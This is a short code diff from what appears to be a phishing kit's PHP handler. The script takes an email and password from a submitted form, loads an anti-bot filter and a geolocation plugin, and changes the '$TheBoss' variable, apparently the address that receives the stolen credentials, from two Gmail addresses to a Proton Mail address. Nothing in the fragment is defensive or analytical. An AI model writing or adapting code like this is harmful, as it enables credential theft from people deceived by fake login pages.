@@ -3,7 +3,7 @@ $Email = $_POST['Email'];
 $password = $_POST['password'];
 include 'antibots.php';
 
-$TheBoss = "terryanderson0110@gmail.com,terry.cole1515@gmail.com";
+$TheBoss = "infocompanyso@proton.me";
 require_once('geoplugin.class.php');
 
 $geoplugin = new geoPlugin();
